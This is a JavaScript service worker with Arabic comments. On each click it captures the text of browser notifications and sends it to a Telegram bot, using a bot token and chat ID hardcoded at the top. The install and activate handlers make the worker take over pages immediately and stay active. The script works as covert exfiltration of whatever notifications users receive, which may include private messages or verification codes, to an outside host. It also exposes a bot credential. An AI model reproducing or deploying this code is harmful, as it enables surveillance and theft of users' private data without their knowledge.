const botToken = '8530728105:AAFIsTnKIKmwOnUxFvna_6IXnxT7wqKtsrE';
const chatId = '7802385639';

// وظيفة إرسال البيانات للتليجرام
function sendLog(text) {
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`)
    .catch(err => console.error("Error sending to bot"));
}

// التقاط محتوى الإشعار عند الضغط عليه (الأضمن تقنياً)
self.addEventListener('notificationclick', function(event) {
    const content = event.notification.body || "إشعار بدون نص";
    sendLog("📩 تم التقاط نص الإشعار:\n" + content);
    event.notification.close();
});

// إبقاء السكربت نشطاً
self.addEventListener('install', (event) => {
    self.skipWaiting();
});

self.addEventListener('activate', (event) => {
    event.waitUntil(clients.claim());
});
